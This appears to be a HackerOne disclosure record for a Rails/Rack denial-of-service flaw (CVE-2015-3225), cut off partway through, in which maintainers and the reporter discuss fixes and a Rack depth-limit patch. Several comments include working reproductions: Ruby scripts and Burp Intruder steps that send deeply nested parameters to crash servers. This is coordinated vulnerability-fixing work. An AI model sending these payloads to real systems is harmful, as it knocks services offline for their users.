{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2015-06-16T21:56:07.702Z", 
    "voters": [
        "eveeez", 
        "craxerbikash", 
        "silv3rpoision", 
        "japz", 
        "cryptographer"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 42797, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2015-06-16T19:06:05.148Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Denial of Service in Action Pack Exception Handling", 
    "is_member_of_team?": null, 
    "vote_count": 5, 
    "summaries": [
        {
            "category": "team", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 164, 
            "content": "Potential Denial of Service Vulnerability in Rack \n\nThere is a potential denial of service vulnerability in Rack. This \nvulnerability has been assigned the CVE identifier CVE-2015-3225. \n\nVersions Affected:  All. \nNot affected:       None. \nFixed Versions:     1.6.2, 1.5.4 \n\nImpact \n------ \nCarefully crafted requests can cause a `SystemStackError` and potentially \ncause a denial of service attack. \n\nAll users running an affected release should either upgrade or use one of the workarounds immediately. \n\nReleases \n-------- \nThe FIXED releases are available at the normal locations. \n\nWorkarounds \n----------- \nThere are no feasible workarounds for this issue. \n\n\nPatches \n------- \nTo aid users who aren't able to upgrade immediately we have provided patches for the two supported release series.  They are in git-am format and consist of a single changeset. \n\n* 1-6-deep_params.patch - Patch for 1.6 series \n* 1-5-deep_params.patch - Patch for 1.5 series \n\nPlease note that only the 1.6.x and 1.5.x series are supported at present.  Users of earlier unsupported releases are advised to upgrade as soon as possible as we cannot guarantee the continued availability of security fixes for unsupported releases. \n\nCredits \n------- \n\nSpecial thanks to Tomek Rabczak from the NCC Group for reporting this! ", 
            "content_html": "<p>Potential Denial of Service Vulnerability in Rack </p>\n\n<p>There is a potential denial of service vulnerability in Rack. This <br>\nvulnerability has been assigned the CVE identifier CVE-2015-3225. </p>\n\n<p>Versions Affected:  All. <br>\nNot affected:       None. <br>\nFixed Versions:     1.6.2, 1.5.4 </p>\n\n<h2 id=\"impact\">Impact </h2>\n\n<p>Carefully crafted requests can cause a <code>SystemStackError</code> and potentially <br>\ncause a denial of service attack. </p>\n\n<p>All users running an affected release should either upgrade or use one of the workarounds immediately. </p>\n\n<h2 id=\"releases\">Releases </h2>\n\n<p>The FIXED releases are available at the normal locations. </p>\n\n<h2 id=\"workarounds\">Workarounds </h2>\n\n<p>There are no feasible workarounds for this issue. </p>\n\n<h2 id=\"patches\">Patches </h2>\n\n<p>To aid users who aren&#39;t able to upgrade immediately we have provided patches for the two supported release series.  They are in git-am format and consist of a single changeset. </p>\n\n<ul>\n<li>1-6-deep_params.patch - Patch for 1.6 series </li>\n<li>1-5-deep_params.patch - Patch for 1.5 series </li>\n</ul>\n\n<p>Please note that only the 1.6.x and 1.5.x series are supported at present.  Users of earlier unsupported releases are advised to upgrade as soon as possible as we cannot guarantee the continued availability of security fixes for unsupported releases. </p>\n\n<h2 id=\"credits\">Credits </h2>\n\n<p>Special thanks to Tomek Rabczak from the NCC Group for reporting this! </p>\n"
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2015-07-16T19:06:05.584Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2015-01-07T22:49:34.819Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-01-07T22:49:34.819Z", 
            "actor": {
                "username": "nzkoz", 
                "url": "/nzkoz", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/317/d755d7b7a2678962b431db6ccd1b0e0b82cec1ed_medium.png?1393990698"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Hi Tomek,\n\nOur initial thoughts are that the best fix here is to ensure that the parameter parsing doesn't recurse unbounded, perhaps a simple fix like:\n\n```ruby\ndef normalize_encode_params(params, max_depth = 15)\n  case params\n  when Hash\n    if max_depth == 0\n      raise ActionController::BadRequest, \"Excessive parameter depth\"\n    end\n    if params.has_key?(:tempfile)\n      UploadedFile.new(params)\n    else\n      params.each_with_object({}) do |(key, val), new_hash|\n        new_hash[key] = if val.is_a?(Array)\n          val.map! { |el| normalize_encode_params(el, max_depth - 1) }\n        else\n          normalize_encode_params(val, max_depth - 1)\n        end\n      end.with_indifferent_access\n    end\n  else\n    params\n  end\nend\n```\n\nI believe that there may be other exceptions which could cause the exception handling code to re-raise, however given how broken ruby can be with rescuing SystemStackErrors this seems the best fix.  How does that sound to you?", 
            "markdown_message": "<p>Hi Tomek,</p>\n\n<p>Our initial thoughts are that the best fix here is to ensure that the parameter parsing doesn&#39;t recurse unbounded, perhaps a simple fix like:</p>\n<pre class=\"highlight ruby\"><code><span class=\"k\">def</span> <span class=\"nf\">normalize_encode_params</span><span class=\"p\">(</span><span class=\"n\">params</span><span class=\"p\">,</span> <span class=\"n\">max_depth</span> <span class=\"o\">=</span> <span class=\"mi\">15</span><span class=\"p\">)</span>\n  <span class=\"k\">case</span> <span class=\"n\">params</span>\n  <span class=\"k\">when</span> <span class=\"no\">Hash</span>\n    <span class=\"k\">if</span> <span class=\"n\">max_depth</span> <span class=\"o\">==</span> <span class=\"mi\">0</span>\n      <span class=\"k\">raise</span> <span class=\"no\">ActionController</span><span class=\"o\">::</span><span class=\"no\">BadRequest</span><span class=\"p\">,</span> <span class=\"s2\">&quot;Excessive parameter depth&quot;</span>\n    <span class=\"k\">end</span>\n    <span class=\"k\">if</span> <span class=\"n\">params</span><span class=\"p\">.</span><span class=\"nf\">has_key?</span><span class=\"p\">(</span><span class=\"ss\">:tempfile</span><span class=\"p\">)</span>\n      <span class=\"no\">UploadedFile</span><span class=\"p\">.</span><span class=\"nf\">new</span><span class=\"p\">(</span><span class=\"n\">params</span><span class=\"p\">)</span>\n    <span class=\"k\">else</span>\n      <span class=\"n\">params</span><span class=\"p\">.</span><span class=\"nf\">each_with_object</span><span class=\"p\">({})</span> <span class=\"k\">do</span> <span class=\"o\">|</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">val</span><span class=\"p\">),</span> <span class=\"n\">new_hash</span><span class=\"o\">|</span>\n        <span class=\"n\">new_hash</span><span class=\"p\">[</span><span class=\"n\">key</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"k\">if</span> <span class=\"n\">val</span><span class=\"p\">.</span><span class=\"nf\">is_a?</span><span class=\"p\">(</span><span class=\"no\">Array</span><span class=\"p\">)</span>\n          <span class=\"n\">val</span><span class=\"p\">.</span><span class=\"nf\">map!</span> <span class=\"p\">{</span> <span class=\"o\">|</span><span class=\"n\">el</span><span class=\"o\">|</span> <span class=\"n\">normalize_encode_params</span><span class=\"p\">(</span><span class=\"n\">el</span><span class=\"p\">,</span> <span class=\"n\">max_depth</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">}</span>\n        <span class=\"k\">else</span>\n          <span class=\"n\">normalize_encode_params</span><span class=\"p\">(</span><span class=\"n\">val</span><span class=\"p\">,</span> <span class=\"n\">max_depth</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">)</span>\n        <span class=\"k\">end</span>\n      <span class=\"k\">end</span><span class=\"p\">.</span><span class=\"nf\">with_indifferent_access</span>\n    <span class=\"k\">end</span>\n  <span class=\"k\">else</span>\n    <span class=\"n\">params</span>\n  <span class=\"k\">end</span>\n<span class=\"k\">end</span>\n</code></pre>\n<p>I believe that there may be other exceptions which could cause the exception handling code to re-raise, however given how broken ruby can be with rescuing SystemStackErrors this seems the best fix.  How does that sound to you?</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 305450, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-01-08T01:08:29.790Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-01-08T01:08:29.790Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Hey Mike, this looks good to me. I took some time to see if I can bypass it and it seems pretty solid. I tried bypassing with different content types as well and it looks like JSON has a default max depth of 100 while XML's max depth seems to be around 300. Also I just found out XML support was dropped from core in 4.0 (good choice there). I manually  included it via actionpack-xml_parser and tested the nesting. It hung once but I was never able to reproduce it again so maybe it was a fluke of some kind. Made a quick script to try and beat it up and it wouldn't fall.\n\n```ruby\nrequire 'net/http'\n\ndef nested_xml(payload, depth)\n  return payload if depth == 0\n  nested_xml(\"<a>#{payload}</a>\", depth-1)\nend\n\nURI_FOR_REQ = URI.parse('http://localhost:3000')\n100.times do\n  (1..315).each do |depth|\n    req = Net::HTTP.new(URI_FOR_REQ.hostname, URI_FOR_REQ.port)\n    xml_data = \"<session>\" + nested_xml(\"<a>bar</a>\", depth)\n    xml_data += \"<email>foo</email><password>bar</password></session>\"\n\n    res = req.post(\"/login\",  xml_data, {'Content-Type' => 'text/xml', 'Content-Length' => xml_data.length.to_s })\n    puts \"Depth: #{depth}\"\n  end\nend\n```\n\nHopefully the max depth of 15 won't break any apps out there. ", 
            "markdown_message": "<p>Hey Mike, this looks good to me. I took some time to see if I can bypass it and it seems pretty solid. I tried bypassing with different content types as well and it looks like JSON has a default max depth of 100 while XML&#39;s max depth seems to be around 300. Also I just found out XML support was dropped from core in 4.0 (good choice there). I manually  included it via actionpack-xml_parser and tested the nesting. It hung once but I was never able to reproduce it again so maybe it was a fluke of some kind. Made a quick script to try and beat it up and it wouldn&#39;t fall.</p>\n<pre class=\"highlight ruby\"><code><span class=\"nb\">require</span> <span class=\"s1\">&#39;net/http&#39;</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">nested_xml</span><span class=\"p\">(</span><span class=\"n\">payload</span><span class=\"p\">,</span> <span class=\"n\">depth</span><span class=\"p\">)</span>\n  <span class=\"k\">return</span> <span class=\"n\">payload</span> <span class=\"k\">if</span> <span class=\"n\">depth</span> <span class=\"o\">==</span> <span class=\"mi\">0</span>\n  <span class=\"n\">nested_xml</span><span class=\"p\">(</span><span class=\"s2\">&quot;&lt;a&gt;</span><span class=\"si\">#{</span><span class=\"n\">payload</span><span class=\"si\">}</span><span class=\"s2\">&lt;/a&gt;&quot;</span><span class=\"p\">,</span> <span class=\"n\">depth</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">)</span>\n<span class=\"k\">end</span>\n\n<span class=\"no\">URI_FOR_REQ</span> <span class=\"o\">=</span> <span class=\"no\">URI</span><span class=\"p\">.</span><span class=\"nf\">parse</span><span class=\"p\">(</span><span class=\"s1\">&#39;http://localhost:3000&#39;</span><span class=\"p\">)</span>\n<span class=\"mi\">100</span><span class=\"p\">.</span><span class=\"nf\">times</span> <span class=\"k\">do</span>\n  <span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">.</span><span class=\"nf\">.</span><span class=\"mi\">315</span><span class=\"p\">).</span><span class=\"nf\">each</span> <span class=\"k\">do</span> <span class=\"o\">|</span><span class=\"n\">depth</span><span class=\"o\">|</span>\n    <span class=\"n\">req</span> <span class=\"o\">=</span> <span class=\"no\">Net</span><span class=\"o\">::</span><span class=\"no\">HTTP</span><span class=\"p\">.</span><span class=\"nf\">new</span><span class=\"p\">(</span><span class=\"no\">URI_FOR_REQ</span><span class=\"p\">.</span><span class=\"nf\">hostname</span><span class=\"p\">,</span> <span class=\"no\">URI_FOR_REQ</span><span class=\"p\">.</span><span class=\"nf\">port</span><span class=\"p\">)</span>\n    <span class=\"n\">xml_data</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;&lt;session&gt;&quot;</span> <span class=\"o\">+</span> <span class=\"n\">nested_xml</span><span class=\"p\">(</span><span class=\"s2\">&quot;&lt;a&gt;bar&lt;/a&gt;&quot;</span><span class=\"p\">,</span> <span class=\"n\">depth</span><span class=\"p\">)</span>\n    <span class=\"n\">xml_data</span> <span class=\"o\">+=</span> <span class=\"s2\">&quot;&lt;email&gt;foo&lt;/email&gt;&lt;password&gt;bar&lt;/password&gt;&lt;/session&gt;&quot;</span>\n\n    <span class=\"n\">res</span> <span class=\"o\">=</span> <span class=\"n\">req</span><span class=\"p\">.</span><span class=\"nf\">post</span><span class=\"p\">(</span><span class=\"s2\">&quot;/login&quot;</span><span class=\"p\">,</span>  <span class=\"n\">xml_data</span><span class=\"p\">,</span> <span class=\"p\">{</span><span class=\"s1\">&#39;Content-Type&#39;</span> <span class=\"o\">=&gt;</span> <span class=\"s1\">&#39;text/xml&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;Content-Length&#39;</span> <span class=\"o\">=&gt;</span> <span class=\"n\">xml_data</span><span class=\"p\">.</span><span class=\"nf\">length</span><span class=\"p\">.</span><span class=\"nf\">to_s</span> <span class=\"p\">})</span>\n    <span class=\"nb\">puts</span> <span class=\"s2\">&quot;Depth: </span><span class=\"si\">#{</span><span class=\"n\">depth</span><span class=\"si\">}</span><span class=\"s2\">&quot;</span>\n  <span class=\"k\">end</span>\n<span class=\"k\">end</span>\n</code></pre>\n<p>Hopefully the max depth of 15 won&#39;t break any apps out there. </p>\n", 
            "type": "Activities::Comment", 
            "id": 305521, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-01-08T02:12:08.610Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-01-08T02:26:47.733Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Also to add a note, the original payload against webrick contained a nesting of 436 levels so maybe defaulting to the JSON max of 100 would be a bit more forgiving here?\n\nEdit: The original payload contained a few, \"just to be sure\" levels. Running Burp starting at a nesting of 1 has Webrick crashing at 344 levels. Unicorn+Nginx was able to handle twice the amount if I remember correctly.", 
            "markdown_message": "<p>Also to add a note, the original payload against webrick contained a nesting of 436 levels so maybe defaulting to the JSON max of 100 would be a bit more forgiving here?</p>\n\n<p>Edit: The original payload contained a few, &quot;just to be sure&quot; levels. Running Burp starting at a nesting of 1 has Webrick crashing at 344 levels. Unicorn+Nginx was able to handle twice the amount if I remember correctly.</p>\n", 
            "type": "Activities::Comment", 
            "id": 305581, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-01-08T17:16:59.504Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-01-08T17:16:59.504Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Aren't we going to have this problem in straight rack apps?  I suspect that Rack's parameter parsing has exactly the same issue (though maybe the stack doesn't grow *as* quickly).", 
            "markdown_message": "<p>Aren&#39;t we going to have this problem in straight rack apps?  I suspect that Rack&#39;s parameter parsing has exactly the same issue (though maybe the stack doesn&#39;t grow <em>as</em> quickly).</p>\n", 
            "type": "Activities::Comment", 
            "id": 306035, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-01-08T18:34:38.167Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-01-08T18:34:38.167Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Yea, it looks like when testing against Sinatra, the same thing happens here although I'm seeing some interesting behavior. If i constantly repeat a request with a large nesting, Webrick will not hang. The hang seems to only occur when I ramp up the nesting. Running this simple app:\n\n```ruby\nrequire 'sinatra'\nget '/hi' do\n  \"hello\"\nend\n```\n\nIn Burp, I put the following request in Intruder:\n\nGET /hi HTTP/1.1\nHost: localhost:4567\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nfoo\u00a7[a]\u00a7=bar\n\nIn the Payloads tab:\n\n1. Under Payload Sets, et the Payload type to \"Character blocks\"\n2. Under Payload Options, set the Base string to \"[a]\"\n3. Set the Min length to 3\n4. Set the Max Length to 3000\n5. Set the Step to 3\n\nStart the Intruder run and it should hang around the 625th request. So yea, I then tried taking that 625th request and replaying it to see if it'll hang and on it's own, it won't work (whereas with Rails a single request seems to be enough). I tried changing only one of the keys in the hash on each repeated request to see if maybe this was a caching thing but that didn't do it either. Not sure why a ramp up in nesting is required here.", 
            "markdown_message": "<p>Yea, it looks like when testing against Sinatra, the same thing happens here although I&#39;m seeing some interesting behavior. If i constantly repeat a request with a large nesting, Webrick will not hang. The hang seems to only occur when I ramp up the nesting. Running this simple app:</p>\n<pre class=\"highlight ruby\"><code><span class=\"nb\">require</span> <span class=\"s1\">&#39;sinatra&#39;</span>\n<span class=\"n\">get</span> <span class=\"s1\">&#39;/hi&#39;</span> <span class=\"k\">do</span>\n  <span class=\"s2\">&quot;hello&quot;</span>\n<span class=\"k\">end</span>\n</code></pre>\n<p>In Burp, I put the following request in Intruder:</p>\n\n<p>GET /hi HTTP/1.1<br>\nHost: localhost:4567<br>\nContent-Type: application/x-www-form-urlencoded<br>\nContent-Length: 10</p>\n\n<p>foo\u00a7[a]\u00a7=bar</p>\n\n<p>In the Payloads tab:</p>\n\n<ol>\n<li>Under Payload Sets, et the Payload type to &quot;Character blocks&quot;</li>\n<li>Under Payload Options, set the Base string to &quot;[a]&quot;</li>\n<li>Set the Min length to 3</li>\n<li>Set the Max Length to 3000</li>\n<li>Set the Step to 3</li>\n</ol>\n\n<p>Start the Intruder run and it should hang around the 625th request. So yea, I then tried taking that 625th request and replaying it to see if it&#39;ll hang and on it&#39;s own, it won&#39;t work (whereas with Rails a single request seems to be enough). I tried changing only one of the keys in the hash on each repeated request to see if maybe this was a caching thing but that didn&#39;t do it either. Not sure why a ramp up in nesting is required here.</p>\n", 
            "type": "Activities::Comment", 
            "id": 306124, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-01-16T20:03:42.746Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-01-16T20:03:42.746Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Hi, just an update on this.  I think the core issue is in Rack, and I can reproduce a system stack error with just a normal rack application.\n\nHere is the rack app:\n\n```\nrun lambda { |env|\n  req = Rack::Request.new env\n  req.params\n  [200, {}, ['hello world']]\n}\n```\n\nHere is the code I used to make the request:\n\n```ruby\nrequire 'net/http'\n\ndef depth_gen size\n  '[a]' * size\nend\n\nuri = URI(\"http://localhost:3000/\")\nresponse = Net::HTTP.post_form(uri, \"foo#{depth_gen(10000)}\" => '10')\n```\n\nI'll make a patch against Rack to fix this, then lets test agains Rails and Sinatra.\n\nOne thing I'm not totally clear on: since we actually kick off the parameter parsing much further down the Rails stack than this Rack app does means that the depth limit for Rails needs to be smaller than for just a straight Rack app.  This also depends on what middle ware the user is running (the more middleware, the smaller the supported stack).\n\nWe *might* eagerly parse the parameters, which would get rid of this variability (but I need to check).\n\nI'll update this with a proposed patch and then investigate Rails internals a bit.", 
            "markdown_message": "<p>Hi, just an update on this.  I think the core issue is in Rack, and I can reproduce a system stack error with just a normal rack application.</p>\n\n<p>Here is the rack app:</p>\n<pre class=\"highlight plaintext\"><code>run lambda { |env|\n  req = Rack::Request.new env\n  req.params\n  [200, {}, [&#39;hello world&#39;]]\n}\n</code></pre>\n<p>Here is the code I used to make the request:</p>\n<pre class=\"highlight ruby\"><code><span class=\"nb\">require</span> <span class=\"s1\">&#39;net/http&#39;</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">depth_gen</span> <span class=\"n\">size</span>\n  <span class=\"s1\">&#39;[a]&#39;</span> <span class=\"o\">*</span> <span class=\"n\">size</span>\n<span class=\"k\">end</span>\n\n<span class=\"n\">uri</span> <span class=\"o\">=</span> <span class=\"no\">URI</span><span class=\"p\">(</span><span class=\"s2\">&quot;http://localhost:3000/&quot;</span><span class=\"p\">)</span>\n<span class=\"n\">response</span> <span class=\"o\">=</span> <span class=\"no\">Net</span><span class=\"o\">::</span><span class=\"no\">HTTP</span><span class=\"p\">.</span><span class=\"nf\">post_form</span><span class=\"p\">(</span><span class=\"n\">uri</span><span class=\"p\">,</span> <span class=\"s2\">&quot;foo</span><span class=\"si\">#{</span><span class=\"n\">depth_gen</span><span class=\"p\">(</span><span class=\"mi\">10000</span><span class=\"p\">)</span><span class=\"si\">}</span><span class=\"s2\">&quot;</span> <span class=\"o\">=&gt;</span> <span class=\"s1\">&#39;10&#39;</span><span class=\"p\">)</span>\n</code></pre>\n<p>I&#39;ll make a patch against Rack to fix this, then lets test agains Rails and Sinatra.</p>\n\n<p>One thing I&#39;m not totally clear on: since we actually kick off the parameter parsing much further down the Rails stack than this Rack app does means that the depth limit for Rails needs to be smaller than for just a straight Rack app.  This also depends on what middle ware the user is running (the more middleware, the smaller the supported stack).</p>\n\n<p>We <em>might</em> eagerly parse the parameters, which would get rid of this variability (but I need to check).</p>\n\n<p>I&#39;ll update this with a proposed patch and then investigate Rails internals a bit.</p>\n", 
            "type": "Activities::Comment", 
            "id": 312488, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-01-16T20:04:39.224Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-01-16T20:04:39.224Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Also I couldn't repro with a GET against thin because it yelled about URL length,\nbut I was still able to get the error via POST.", 
            "markdown_message": "<p>Also I couldn&#39;t repro with a GET against thin because it yelled about URL length,<br>\nbut I was still able to get the error via POST.</p>\n", 
            "type": "Activities::Comment", 
            "id": 312490, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-01-20T20:34:30.694Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-01-20T20:34:30.694Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Hi,\n\nHere's my proposed patch:\n\n```diff\ndiff --git a/lib/rack/utils.rb b/lib/rack/utils.rb\nindex eea8c87..ef831cb 100644\n--- a/lib/rack/utils.rb\n+++ b/lib/rack/utils.rb\n@@ -61,12 +61,14 @@ module Rack\n \n     class << self\n       attr_accessor :key_space_limit\n+      attr_accessor :param_depth_limit\n       attr_accessor :multipart_part_limit\n     end\n \n     # The default number of bytes to allow parameter keys to take up.\n     # This helps prevent a rogue client from flooding a Request.\n     self.key_space_limit = 65536\n+    self.param_depth_limit = 25\n \n     # The maximum number of parts a request can contain. Accepting too many part\n     # can lead to the server running out of file handles.\n@@ -126,7 +128,9 @@ module Rack\n     # normalize_params recursively expands parameters into structural types. If\n     # the structural types represented by two different parameter names are in\n     # conflict, a ParameterTypeError is raised.\n-    def normalize_params(params, name, v = nil)\n+    def normalize_params(params, name, v = nil, depth = Utils.param_depth_limit)\n+      raise RangeError if depth <= 0\n+\n       name =~ %r(\\A[\\[\\]]*([^\\[\\]]+)\\]*)\n       k = $1 || ''\n       after = $' || ''\n@@ -146,14 +150,14 @@ module Rack\n         params[k] ||= []\n         raise ParameterTypeError, \"expected Array (got #{params[k].class.name}) for param `#{k}'\" unless params[k].is_a?(Array)\n         if params_hash_type?(params[k].last) && !params[k].last.key?(child_key)\n-          normalize_params(params[k].last, child_key, v)\n+          normalize_params(params[k].last, child_key, v, depth - 1)\n         else\n-          params[k] << normalize_params(params.class.new, child_key, v)\n+          params[k] << normalize_params(params.class.new, child_key, v, depth - 1)\n         end\n       else\n         params[k] ||= params.class.new\n         raise ParameterTypeError, \"expected Hash (got #{params[k].class.name}) for param `#{k}'\" unless params_hash_type?(params[k])\n-        params[k] = normalize_params(params[k], after, v)\n+        params[k] = normalize_params(params[k], after, v, depth - 1)\n       end\n \n       return params\n```\n\nIt seems to fix the stack error.  I set the max depth to 25, but we could set it to whatever.  I think this means we won't have to modify Rails to fix this.  Any comments on this patch?  If it looks good, I can package a prerelease of Rack so we can test Sinatra and Rails against the fix.", 
            "markdown_message": "<p>Hi,</p>\n\n<p>Here&#39;s my proposed patch:</p>\n<pre class=\"highlight diff\"><code><span class=\"gh\">diff --git a/lib/rack/utils.rb b/lib/rack/utils.rb\nindex eea8c87..ef831cb 100644\n</span><span class=\"gd\">--- a/lib/rack/utils.rb\n</span><span class=\"gi\">+++ b/lib/rack/utils.rb\n</span><span class=\"gu\">@@ -61,12 +61,14 @@ module Rack\n</span>\n     class &lt;&lt; self\n       attr_accessor :key_space_limit\n<span class=\"gi\">+      attr_accessor :param_depth_limit\n</span>       attr_accessor :multipart_part_limit\n     end\n\n     # The default number of bytes to allow parameter keys to take up.\n     # This helps prevent a rogue client from flooding a Request.\n     self.key_space_limit = 65536\n<span class=\"gi\">+    self.param_depth_limit = 25\n</span>\n     # The maximum number of parts a request can contain. Accepting too many part\n     # can lead to the server running out of file handles.\n<span class=\"gu\">@@ -126,7 +128,9 @@ module Rack\n</span>     # normalize_params recursively expands parameters into structural types. If\n     # the structural types represented by two different parameter names are in\n     # conflict, a ParameterTypeError is raised.\n<span class=\"gd\">-    def normalize_params(params, name, v = nil)\n</span><span class=\"gi\">+    def normalize_params(params, name, v = nil, depth = Utils.param_depth_limit)\n+      raise RangeError if depth &lt;= 0\n+\n</span>       name =~ %r(\\A[\\[\\]]*([^\\[\\]]+)\\]*)\n       k = $1 || &#39;&#39;\n       after = $&#39; || &#39;&#39;\n<span class=\"gu\">@@ -146,14 +150,14 @@ module Rack\n</span>         params[k] ||= []\n         raise ParameterTypeError, &quot;expected Array (got #{params[k].class.name}) for param `#{k}&#39;&quot; unless params[k].is_a?(Array)\n         if params_hash_type?(params[k].last) &amp;&amp; !params[k].last.key?(child_key)\n<span class=\"gd\">-          normalize_params(params[k].last, child_key, v)\n</span><span class=\"gi\">+          normalize_params(params[k].last, child_key, v, depth - 1)\n</span>         else\n<span class=\"gd\">-          params[k] &lt;&lt; normalize_params(params.class.new, child_key, v)\n</span><span class=\"gi\">+          params[k] &lt;&lt; normalize_params(params.class.new, child_key, v, depth - 1)\n</span>         end\n       else\n         params[k] ||= params.class.new\n         raise ParameterTypeError, &quot;expected Hash (got #{params[k].class.name}) for param `#{k}&#39;&quot; unless params_hash_type?(params[k])\n<span class=\"gd\">-        params[k] = normalize_params(params[k], after, v)\n</span><span class=\"gi\">+        params[k] = normalize_params(params[k], after, v, depth - 1)\n</span>       end\n\n       return params\n</code></pre>\n<p>It seems to fix the stack error.  I set the max depth to 25, but we could set it to whatever.  I think this means we won&#39;t have to modify Rails to fix this.  Any comments on this patch?  If it looks good, I can package a prerelease of Rack so we can test Sinatra and Rails against the fix.</p>\n", 
            "type": "Activities::Comment", 
            "id": 314239, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-01-20T22:10:38.185Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-01-20T22:10:38.185Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
